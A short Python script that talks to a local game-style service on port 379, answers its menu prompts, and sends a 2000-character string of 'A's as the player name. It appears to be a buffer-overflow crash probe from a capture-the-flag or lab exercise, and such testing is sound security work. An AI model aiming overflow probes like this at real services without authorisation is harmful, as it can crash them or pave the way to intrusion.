import socket

s = socket.socket()
s.connect(("localhost", 379))

data = s.recv(1024)
decoded = data.decode()

while len(decoded) != 0:
    
    print(decoded)
    
    if decoded.__contains__("Play the game"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())
    
    if decoded.__contains__("pick a name"):
        #msg = "jack"
        msg = "A" * 2000
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    if decoded.__contains__("Ale, of course!"):
        msg = "1"
        print(f">>> Sending {msg}\n")
        s.send(msg.encode())

    try:
        data = s.recv(1024)
        decoded = data.decode()
    except:
        data = 0

s.close()

